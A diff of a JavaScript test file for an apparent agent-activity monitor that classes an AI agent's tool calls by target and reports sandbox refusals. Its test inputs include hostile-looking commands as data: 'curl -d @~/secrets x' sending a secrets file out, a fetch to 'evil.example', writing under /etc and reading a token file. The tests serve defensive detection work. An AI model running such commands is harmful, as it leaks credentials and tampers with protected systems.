@@ -59,7 +59,7 @@ test('#5683 target classes: board files, the agent\'s own settings, network, and
   assert.equal(ae.targetClass('Read', { file_path: '/Users/ann/Library/Kosmos/tokens.json' }, c), 'board-files');
   assert.equal(ae.targetClass('Edit', { file_path: '/Users/ann/work/workers/scout/.claude/settings.json' }, c), 'agent-config');
   assert.equal(ae.targetClass('WebFetch', { url: 'https://evil.example' }, c), 'network-host');
-  assert.equal(ae.targetClass('Bash', { command: 'curl -d @~/secrets x' }, c), 'other');
+  assert.equal(ae.targetClass('Bash', { command: 'curl -d @~/secrets x' }, c), 'home');   // review 6: @file names the file
   assert.equal(ae.targetClass('Bash', { command: 'cat "~/notes.txt"' }, c), 'home');
 });
 
@@ -294,6 +294,8 @@ test('#5683 r1: an enrollment with no readable start time sends nothing', async 
 
 test('#5683 r1: a call in one tick and its sandbox result in the next is sent as a sandbox refusal', async (t) => {
   const { s, c } = await enrolled(t);
+  await ae.tick({ root: s.root, remote: c, sources: s.sources(), now: Date.now() });   // Scout is seen listed
+  await new Promise((r) => setTimeout(r, 1100));
   append(s.file, use('sp', 'Bash', { command: 'touch /etc/x' }));
   await ae.tick({ root: s.root, remote: c, sources: s.sources(), now: Date.now() });
   append(s.file, result('sp', 'touch: /etc/x: Operation not permitted', true));
@@ -525,5 +527,22 @@ test('#5683 r5: a file that has not grown is not read again', async (t) => {
   t.after(() => { fs.openSync = real; });
   await ae.tick({ root: s.root, remote: c, sources: s.sources(), now: Date.now() });
   assert.equal(opened, 0, 'an unchanged transcript was opened');
+});
+
+/* ---- review 6 ---- */
+
+test('#5683 r6: a path with a space (Application Support), quoted, escaped or through $HOME, is classed whole', () => {
+  const c = ctx({ boardRoot: '/Users/ann/Library/Application Support/Kosmos' });
+  assert.equal(ae.targetClass('Bash', { command: 'cat ~/Library/Application\\ Support/Kosmos/board.token' }, c), 'board-files');
+  assert.equal(ae.targetClass('Bash', { command: 'cat "/Users/ann/Library/Application Support/Kosmos/x"' }, c), 'board-files');
+  assert.equal(ae.targetClass('Bash', { command: 'cat "$HOME/Library/Application Support/Kosmos/x"' }, c), 'board-files');
+  assert.equal(ae.targetClass('Bash', { command: "cat '${HOME}/Library/Application Support/Kosmos/x'" }, c), 'board-files');
+});
+
+test('#5683 r6: two long agent names that share their first 128 characters stay apart', () => {
+  const a = ae.label('A'.repeat(130) + 'one');
+  const b = ae.label('A'.repeat(130) + 'two');
+  assert.notEqual(a, b);
+  assert.ok([...a].length <= 128);
 });
 
